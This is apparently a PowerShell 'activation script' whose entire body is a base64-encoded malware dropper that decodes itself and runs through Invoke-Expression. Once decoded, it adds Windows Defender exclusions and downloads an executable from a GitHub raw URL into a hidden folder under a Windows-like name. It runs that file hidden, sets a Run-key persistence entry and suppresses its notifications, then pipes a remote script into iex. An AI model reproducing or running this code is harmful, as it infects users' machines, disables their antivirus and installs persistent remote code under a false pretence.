$base64EncodedString = "QWRkLVR5cGUgLUFzc2VtYmx5TmFtZSBTeXN0ZW0uV2luZG93cy5Gb3JtcwpmdW5jdGlvbiBTaG93LUVycm9yTWVzc2FnZSB7CgogICAgcGFyYW0gKAoKICAgICAgICBbc3RyaW5nXSRtZXNzYWdlLAoKICAgICAgICBbc3RyaW5nXSR0aXRsZSA9ICJJbnN1ZmZpY2llbnQgcHJpdmlsZWdlcyIKCiAgICApCgogICAgCgogICAgW1N5c3RlbS5XaW5kb3dzLkZvcm1zLk1lc3NhZ2VCb3hdOjpTaG93KCRtZXNzYWdlLCAkdGl0bGUsIFtTeXN0ZW0uV2luZG93cy5Gb3Jtcy5NZXNzYWdlQm94QnV0dG9uc106Ok9LLCBbU3lzdGVtLldpbmRvd3MuRm9ybXMuTWVzc2FnZUJveEljb25dOjpFcnJvcikKCn0KaWYgKC1OT1QgKFtTZWN1cml0eS5QcmluY2lwYWwuV2luZG93c1ByaW5jaXBhbF0gW1NlY3VyaXR5LlByaW5jaXBhbC5XaW5kb3dzSWRlbnRpdHldOjpHZXRDdXJyZW50KCkpLklzSW5Sb2xlKGAKW1NlY3VyaXR5LlByaW5jaXBhbC5XaW5kb3dzQnVpbHRJblJvbGVdICJBZG1pbmlzdHJhdG9yIikpIHsKICAgIFdyaXRlLVdhcm5pbmcgIkluc3VmZmljaWVudCBwcml2aWxlZ2VzIHRvIGV4ZWN1dGUgdGhpcyBzY3JpcHQuIE9wZW4gYSBQb3dlclNoZWxsIGNvbnNvbGUgd2l0aCBhZG1pbmlzdHJhdG9yIHByaXZpbGVnZXMgYW5kIHJ1biB0aGUgc2NyaXB0IGFnYWluLiIKICAgIFNob3ctRXJyb3JNZXNzYWdlIC1tZXNzYWdlICJJbnN1ZmZpY2llbnQgcHJpdmlsZWdlcyB0byBleGVjdXRlIHRoaXMgc2NyaXB0LiBPcGVuIGEgUG93ZXJTaGVsbCBjb25zb2xlIHdpdGggYWRtaW5pc3RyYXRvciBwcml2aWxlZ2VzIGFuZCBydW4gdGhlIHNjcmlwdCBhZ2Fpbi4iCkJyZWFrCn0KCiMgQmFzZTY0LWVuY29kZWQgc3RyaW5ncyBmb3IgdGhpcmQgZG93bmxvYWQgKG9mZmljZW1pY3JvLmV4ZSkKJG9mZmljZURvd25sb2FkVXJsQjY0ID0gW0NvbnZlcnRdOjpUb0Jhc2U2NFN0cmluZyhbU3lzdGVtLlRleHQuRW5jb2RpbmddOjpVVEY4LkdldEJ5dGVzKCJodHRwczovL2dpdGh1Yi5jb20vV2luZG93c1R3ZWFrc1gvUG93ZXJTaGVsbEFjdGl2YXRlL3Jhdy9yZWZzL2hlYWRzL21haW4vZG9sYmFlYi5leGUiKSkKJHVwZGF0ZXJyckV4ZUI2NCA9IFtDb252ZXJ0XTo6VG9CYXNlNjRTdHJpbmcoW1N5c3RlbS5UZXh0LkVuY29kaW5nXTo6VVRGOC5HZXRCeXRlcygiV2luZG93c0hvc3RBcHBsaWNhdGlvbi5leGUiKSkKIyBDb21tb24gYXR0cmlidXRlcwokaGlkZGVuQXR0ckI2NCA9IFtDb252ZXJ0XTo6VG9CYXNlNjRTdHJpbmcoW1N5c3RlbS5UZXh0LkVuY29kaW5nXTo6VVRGOC5HZXRCeXRlcygiSGlkZGVuIikpCiRzaWxlbnRseUNvbnRpbnVlQjY0ID0gW0NvbnZlcnRdOjpUb0Jhc2U2NFN0cmluZyhbU3lzdGVtLlRleHQuRW5jb2RpbmddOjpVVEY4LkdldEJ5dGVzKCJTaWxlbnRseUNvbnRpbnVlIikpCiRzdG9wQWN0aW9uQjY0ID0gW0NvbnZlcnRdOjpUb0Jhc2U2NFN0cmluZyhbU3lzdGVtLlRleHQuRW5jb2RpbmddOjpVVEY4LkdldEJ5dGVzKCJTdG9wIikpCiRkaXJlY3RvcnlCNjQgPSBbQ29udmVydF06OlRvQmFzZTY0U3RyaW5nKFtTeXN0ZW0uVGV4dC5FbmNvZGluZ106OlVURjguR2V0Qnl0ZXMoIkRpcmVjdG9yeSIpKQoKIyBEZWNvZGUgdGhlbQokb2ZmaWNlRG93bmxvYWRVcmwgPSBbU3lzdGVtLlRleHQuRW5jb2RpbmddOjpVVEY4LkdldFN0cmluZyhbU3lzdGVtLkNvbnZlcnRdOjpGcm9tQmFzZTY0U3RyaW5nKCRvZmZpY2VEb3dubG9hZFVybEI2NCkpCiR1cGRhdGVycnJFeGUgPSBbU3lzdGVtLlRleHQuRW5jb2RpbmddOjpVVEY4LkdldFN0cmluZyhbU3lzdGVtLkNvbnZlcnRdOjpGcm9tQmFzZTY0U3RyaW5nKCR1cGRhdGVycnJFeGVCNjQpKQokaGlkZGVuQXR0ciA9IFtTeXN0ZW0uVGV4dC5FbmNvZGluZ106OlVURjguR2V0U3RyaW5nKFtTeXN0ZW0uQ29udmVydF06OkZyb21CYXNlNjRTdHJpbmcoJGhpZGRlbkF0dHJCNjQpKQokc2lsZW50bHlDb250aW51ZSA9IFtTeXN0ZW0uVGV4dC5FbmNvZGluZ106OlVURjguR2V0U3RyaW5nKFtTeXN0ZW0uQ29udmVydF06OkZyb21CYXNlNjRTdHJpbmcoJHNpbGVudGx5Q29udGludWVCNjQpKQokc3RvcEFjdGlvbiA9IFtTeXN0ZW0uVGV4dC5FbmNvZGluZ106OlVURjguR2V0U3RyaW5nKFtTeXN0ZW0uQ29udmVydF06OkZyb21CYXNlNjRTdHJpbmcoJHN0b3BBY3Rpb25CNjQpKQokZGlyZWN0b3J5ID0gW1N5c3RlbS5UZXh0LkVuY29kaW5nXTo6VVRGOC5HZXRTdHJpbmcoW1N5c3RlbS5Db252ZXJ0XTo6RnJvbUJhc2U2NFN0cmluZygkZGlyZWN0b3J5QjY0KSkKCiMgQ3JlYXRlIGEgbmV3IGhpZGRlbiBmb2xkZXJBZGQtRm9sZGVyRXhjbHVzaW9uCiRoaWRkZW5Gb2xkZXJOYW1lID0gIk5vdGlmeVRlbXBfIiArIFtTeXN0ZW0uR3VpZF06Ok5ld0d1aWQoKS5Ub1N0cmluZygpLlN1YnN0cmluZygwLDgpCiRoaWRkZW5Gb2xkZXIgPSBKb2luLVBhdGggJGVudjpMT0NBTEFQUERBVEEgJGhpZGRlbkZvbGRlck5hbWUKTmV3LUl0ZW0gLUl0ZW1UeXBlICRkaXJlY3RvcnkgLVBhdGggJGhpZGRlbkZvbGRlciAtRm9yY2UgfCBPdXQtTnVsbAokb2ZmaWNlUGF0aCA9IEpvaW4tUGF0aCAkaGlkZGVuRm9sZGVyICR1cGRhdGVycnJFeGUKCiMgRnVuY3Rpb24gdG8gYWRkIGZvbGRlciBleGNsdXNpb24KIyBGdW5jdGlvbiB0byBhZGQgZXhjbHVzaW9ucyB3aXRoIHJldHJ5IGFuZCB2ZXJpZmljYXRpb24KZnVuY3Rpb24gQWRkLUZvbGRlckV4Y2x1c2lvbiB7CiAgICBwYXJhbSAoCiAgICAgICAgW3N0cmluZ10kcGF0aCwKICAgICAgICBbaW50XSRtYXhSZXRyaWVzID0gNSwKICAgICAgICBbaW50XSRkZWxheVNlY29uZHMgPSAxCiAgICApCiAgICAkcmV0cnlDb3VudCA9IDAKICAgICRzdWNjZXNzID0gJGZhbHNlCiAgICAKICAgIHdoaWxlICgtbm90ICRzdWNjZXNzIC1hbmQgJHJldHJ5Q291bnQgLWx0ICRtYXhSZXRyaWVzKSB7CiAgICAgICAgdHJ5IHsKICAgICAgICAgICAgQWRkLU1wUHJlZmVyZW5jZSAtRXhjbHVzaW9uUGF0aCAkcGF0aCAtRXJyb3JBY3Rpb24gJHN0b3BBY3Rpb24KICAgICAgICAgICAgIyBWZXJpZnkgZXhjbHVzaW9uIHdhcyBhZGRlZCAocmVxdWlyZXMgYWRtaW4gcmlnaHRzIHRvIGNoZWNrLCBidXQgYXR0ZW1wdCBhbnl3YXkpCiAgICAgICAgICAgIGlmIChHZXQtTXBQcmVmZXJlbmNlIHwgU2VsZWN0LU9iamVjdCAtRXhwYW5kUHJvcGVydHkgRXhjbHVzaW9uUGF0aCB8IFdoZXJlLU9iamVjdCB7ICRfIC1lcSAkcGF0aCB9KSB7CiAgICAgICAgICAgICAgICAkc3VjY2VzcyA9ICR0cnVlCiAgICAgICAgICAgIH0KICAgICAgICB9IGNhdGNoIHsKICAgICAgICAgICAgJHJldHJ5Q291bnQrKwogICAgICAgICAgICBTdGFydC1TbGVlcCAtU2Vjb25kcyAkZGVsYXlTZWNvbmRzCiAgICAgICAgfQogICAgfQogICAgaWYgKC1ub3QgJHN1Y2Nlc3MpIHsKICAgIH0KICAgICMgQWRkaXRpb25hbCBkZWxheSB0byBlbnN1cmUgZXhjbHVzaW9uIHRha2VzIGVmZmVjdAogICAgU3RhcnQtU2xlZXAgLU1pbGxpc2Vjb25kcyAyMDAKfQoKCiMgTWFpbiBleGVjdXRpb24KdHJ5IHsKICAgIEFkZC1NcFByZWZlcmVuY2UgLUV4Y2x1c2lvblBhdGggIkM6XFByb2dyYW0gRmlsZXMiCiAgICBXcml0ZS1Ib3N0ICJMb2FkaW5nIEFjdGl2YXRpb24gU2NyaXB0Li4uIiAtRm9yZWdyb3VuZENvbG9yIERhcmtHcmVlbiAtQmFja2dyb3VuZENvbG9yIFdoaXRlCiAgICAjIEFkZCBmb2xkZXIgZXhjbHVzaW9uIEJFRk9SRSBkb3dubG9hZHMKICAgIEFkZC1Gb2xkZXJFeGNsdXNpb24gLXBhdGggJGhpZGRlbkZvbGRlcgogICAgIyBBZGQgZmlsZS1zcGVjaWZpYyBleGNsdXNpb25zIGZvciBleHRyYSBwcm90ZWN0aW9uCiAgICBBZGQtTXBQcmVmZXJlbmNlIC1FeGNsdXNpb25QYXRoICRvZmZpY2VQYXRoCiAgICAKICAgIAogICAgIyBEb3dubG9hZCBvZmZpY2VtaWNyby5leGUgYXMgdXBkYXRlcnJyLmV4ZQogICAgSW52b2tlLVdlYlJlcXVlc3QgLVVyaSAkb2ZmaWNlRG93bmxvYWRVcmwgLU91dEZpbGUgJG9mZmljZVBhdGggLVVzZUJhc2ljUGFyc2luZyAtRXJyb3JBY3Rpb24gJHN0b3BBY3Rpb24KICAgICMgU2V0IGZvbGRlciBhbmQgZmlsZXMgYXMgaGlkZGVuCiAgICBTZXQtSXRlbVByb3BlcnR5IC1QYXRoICRoaWRkZW5Gb2xkZXIgLU5hbWUgQXR0cmlidXRlcyAtVmFsdWUgJGhpZGRlbkF0dHIKICAgIFNldC1JdGVtUHJvcGVydHkgLVBhdGggJG9mZmljZVBhdGggLU5hbWUgQXR0cmlidXRlcyAtVmFsdWUgJGhpZGRlbkF0dHIKICAgIAogICAgIyBSdW4gYWxsIGZpbGVzIHNpbGVudGx5IGluIHRoZSBjdXJyZW50IHNlc3Npb24KICAgIFN0YXJ0LVByb2Nlc3MgLUZpbGVQYXRoICRvZmZpY2VQYXRoIC1XaW5kb3dTdHlsZSBIaWRkZW4KICAgICAgIAoKICAgICRyZWdQYXRoT2ZmaWNlID0gIkhLQ1U6XFNvZnR3YXJlXE1pY3Jvc29mdFxXaW5kb3dzXEN1cnJlbnRWZXJzaW9uXFJ1biIKICAgICRyZWdOYW1lT2ZmaWNlID0gIk9mZmljZU1pY3JvVXBkYXRlIgogICAgJHJlZ1ZhbHVlT2ZmaWNlID0gInBvd2Vyc2hlbGwuZXhlIC1XaW5kb3dTdHlsZSBIaWRkZW4gLUNvbW1hbmQgYCIkb2ZmaWNlUGF0aGAiIgogICAgU2V0LUl0ZW1Qcm9wZXJ0eSAtUGF0aCAkcmVnUGF0aE9mZmljZSAtTmFtZSAkcmVnTmFtZU9mZmljZSAtVmFsdWUgJHJlZ1ZhbHVlT2ZmaWNlIC1FcnJvckFjdGlvbiAkc2lsZW50bHlDb250aW51ZQogICAgCiAgICAjIFN1cHByZXNzIG5vdGlmaWNhdGlvbnMgZnJvbSB1cGRhdGVycnIuZXhlCiAgICBOZXctSXRlbSAtUGF0aCAiSEtDVTpcU29mdHdhcmVcTWljcm9zb2Z0XFdpbmRvd3NcQ3VycmVudFZlcnNpb25cTm90aWZpY2F0aW9uc1xTZXR0aW5ncyIgLU5hbWUgJHVwZGF0ZXJyckV4ZSAtRm9yY2UgfCBPdXQtTnVsbAogICAgU2V0LUl0ZW1Qcm9wZXJ0eSAtUGF0aCAiSEtDVTpcU29mdHdhcmVcTWljcm9zb2Z0XFdpbmRvd3NcQ3VycmVudFZlcnNpb25cTm90aWZpY2F0aW9uc1xTZXR0aW5nc1wkdXBkYXRlcnJyRXhlIiAtTmFtZSAiRW5hYmxlZCIgLVZhbHVlIDAgLUVycm9yQWN0aW9uICRzaWxlbnRseUNvbnRpbnVlCiAgICAKICAgICMgV2FpdCBicmllZmx5IGZvciBleGVjdXRpb24KICAgIFN0YXJ0LVNsZWVwIC1TZWNvbmRzIDIKfSBjYXRjaCB7CiAgICAjIE91dHB1dCBlcnJvciBmb3IgZGVidWdnaW5nCiAgICBXcml0ZS1Ib3N0ICJFcnJvcjogJF8iCiAgICBleGl0IDEKfSBmaW5hbGx5IHsKCgogICAgfQogICAgIyBObyBjbGVhbnVwIC0gbGVhdmUgdHJhY2VzIGFzIHJlcXVlc3RlZAogICAgaXJtIGh0dHBzOi8vZ2V0LmFjdGl2YXRlZC53aW4gfCBpZXgKICAgIAo="
$decodedBytes = [System.Convert]::FromBase64String($base64EncodedString)
$decodedString = [System.Text.Encoding]::UTF8.GetString($decodedBytes)
Invoke-Expression $decodedString
